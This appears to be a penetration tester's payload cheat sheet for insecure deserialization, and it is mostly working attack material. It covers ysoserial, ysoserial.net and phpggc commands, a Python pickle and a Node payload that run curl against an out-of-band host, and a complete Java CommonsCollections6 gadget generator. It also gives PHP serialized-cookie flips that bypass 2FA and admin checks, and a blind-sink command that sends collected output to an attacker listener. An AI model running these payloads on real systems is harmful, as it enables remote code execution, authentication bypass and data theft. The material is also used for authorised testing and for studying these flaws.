---
title: "Payloads: Insecure Deserialization"
type: payloads
tags: [payloads, deserialization, rce, java, dotnet, php, python]
sources: []
date_created: 2026-06-16
date_updated: 2026-06-30
---

# Payloads: Insecure Deserialization

Gadget-chain RCE per language. **Always fire a benign OOB probe first** (Java URLDNS) to prove the sink before a command gadget. Routed via the `hunt-deserialization` skill. See [[insecure-deserialization]].

## Fingerprint (magic bytes, base64)
```
rO0AB           Java (0xAC 0xED)        AAEAAAD/////    .NET BinaryFormatter
a:2:{ / O:4:    PHP serialize()         gASV / gAR      Python pickle
BAh / --- !ruby Ruby Marshal / YAML     _$$ND_FUNC$$_   Node node-serialize
```

## Java (ysoserial)
```bash
java -jar ysoserial.jar URLDNS "http://<id>.oob.example" | base64 -w0     # OOB PROBE first
java -jar ysoserial.jar CommonsCollections6 "curl http://<id>.oob.example/x" | base64 -w0
# common gadgets: CommonsCollections1-7, CommonsBeanutils1, Spring1/2, Hibernate1, ROME, Clojure
# JRMP listener for ysoserial JRMPClient chains:
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 'cmd'
```

## .NET (ysoserial.net)
```
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc"
ysoserial.exe -p ViewState --generator=<__VIEWSTATEGENERATOR> --validationkey=<key> --validationalg=SHA1 -c "cmd"
# formatters: BinaryFormatter, LosFormatter, Json.Net, ObjectDataProvider (XAML)
```

## PHP (phpggc, or hand-built POP chain)
```bash
phpggc Laravel/RCE9 system id              # framework gadget chains
phpggc Monolog/RCE1 system id -b           # base64 output
# hand-built: class with __destruct/__wakeup/__toString reaching a sink
# phar deserialization (no unserialize() call needed):
phpggc Monolog/RCE1 system id --phar phar -o evil.phar   # then trigger via phar://upload.jpg
```

### Object property injection - NO gadget needed (try this FIRST)
A serialized PHP object in a **cookie or param** (`O:N:"Class":...`) that the app `unserialize()`s and
then trusts for an auth/state decision = flip the property, no gadget chain required. Recognize the
shape and rewrite the value:
```
O:9:"AuthToken":1:{s:9:"validated";b:0;}     ->   ...;b:1;}        # boolean 2FA/login flag: false->true
O:4:"User":2:{s:4:"name";s:3:"bob";s:7:"isAdmin";b:0;}  -> isAdmin b:1, or name->"admin"
# serialized format: b:0/b:1 bool · i:N int · s:LEN:"str" (LEN must match new length!) · O:LEN:"Class":COUNT:{...}
```
URL-decode the cookie, edit the flag, URL-encode back. If you change a string, fix its length prefix.
This was THM Extract's 2FA bypass (flip `validated` `b:0`->`b:1`). Only reach for phpggc/POP gadgets
(above) when a flag flip isn't enough and a class with a useful magic method is in scope. See
[[insecure-deserialization]].

## Python (pickle / yaml)
```python
import pickle, os, base64
class E:
    def __reduce__(self): return (os.system, ("curl http://<id>.oob.example",))
print(base64.b64encode(pickle.dumps(E())).decode())
# unsafe YAML:
# !!python/object/apply:os.system ["id"]
```

## Ruby
```
# unsafe YAML.load / Marshal.load -> universal gadget (Gem / DependencyList)
--- !ruby/object:Gem::Installer ...   # use a current universal RCE chain
```

## Node (node-serialize)
```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://<id>.oob.example')}()"}
```

### Build the gadget yourself (ysoserial unavailable) + modern-JDK generation gotchas

When you cannot get a ysoserial jar (offline tooling box; the jitpack build URL often returns an
empty/9-byte stub), compile a minimal generator against the target's gadget library pulled from Maven
Central. You only need the exact lib the target has on its classpath (read its `pom.xml`/jars) - e.g.
`commons-collections 3.2.1`:

```bash
curl -sLO https://repo1.maven.org/maven2/commons-collections/commons-collections/3.2.1/commons-collections-3.2.1.jar
javac --release 17 -cp commons-collections-3.2.1.jar G6.java
java --add-opens java.base/java.util=ALL-UNNAMED -cp .:commons-collections-3.2.1.jar G6 'bash -c "id"' | tee payload.b64
```

`G6.java` = the frohoff **CommonsCollections6** chain (portable; prefer it over CC5 on modern JDKs):

```java
import org.apache.commons.collections.*; import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap;
import java.io.*; import java.lang.reflect.*; import java.util.*;
public class G6 { public static void main(String[] a) throws Exception {
  Transformer[] t = { new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",new Class[0]}),
    new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null,new Object[0]}),
    new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{new String[]{"bash","-c",a[0]}}),
    new ConstantTransformer(1) };
  Transformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(1) }); // benign during build
  Map lazy = LazyMap.decorate(new HashMap(), chain);
  TiedMapEntry tme = new TiedMapEntry(lazy, "foo");
  HashSet set = new HashSet(1); set.add("foo");
  Field mf = HashSet.class.getDeclaredField("map"); mf.setAccessible(true);
  HashMap hm = (HashMap) mf.get(set);
  Field tf = HashMap.class.getDeclaredField("table"); tf.setAccessible(true);
  Object[] tbl = (Object[]) tf.get(hm); Object node = tbl[0]!=null?tbl[0]:tbl[1];
  Field kf = node.getClass().getDeclaredField("key"); kf.setAccessible(true); kf.set(node, tme);
  Field it = ChainedTransformer.class.getDeclaredField("iTransformers"); it.setAccessible(true); it.set(chain, t);
  ByteArrayOutputStream b = new ByteArrayOutputStream();
  try (ObjectOutputStream o = new ObjectOutputStream(b)) { o.writeObject(set); }
  System.out.print(Base64.getEncoder().encodeToString(b.toByteArray()));
}}
```

Modern-JDK (17/21) generation gotchas that eat time:

- **Class-version mismatch:** if `javac` is newer than the run JRE you get `UnsupportedClassVersionError`
  (`class file version 69.0 ... only recognizes up to 65.0`). Compile with `--release <runtime-major>`
  (e.g. `--release 17`, runnable on JRE 17/21).
- **Module access:** reflection into JDK internals throws `InaccessibleObjectException`. Add
  `--add-opens java.base/java.util=ALL-UNNAMED` (CC6 touches HashMap/HashSet internals);
  `--add-opens java.management/javax.management=ALL-UNNAMED` for CC5.
- **CC5 is dead on JDK 21:** `BadAttributeValueExpException.val` is declared `String` there, so you
  cannot reflectively set a `TiedMapEntry` into it (`IllegalArgumentException`). Use **CC6** (HashSet
  based), which avoids that field entirely.
- The serialized bytes are portable across JDKs for these standard classes; only GENERATION is
  JDK-sensitive. The target just needs the gadget lib + a self-triggering `readObject` sink.

**Blind sink** (server echoes only success/failure, e.g. `"Batch accepted: HashSet"`): the response
carries no command output, so make the command exfil - a reverse shell, or
`{ ...discover...; } > /tmp/o; curl http://<you>:<port>/ --data-binary @/tmp/o` to a listener. A
successful readObject that still returns normally is consistent with the gadget having fired as a side
effect. See [[insecure-deserialization]].

<!-- promoted-slug: deser-build-gadget-jdk-gotchas -->
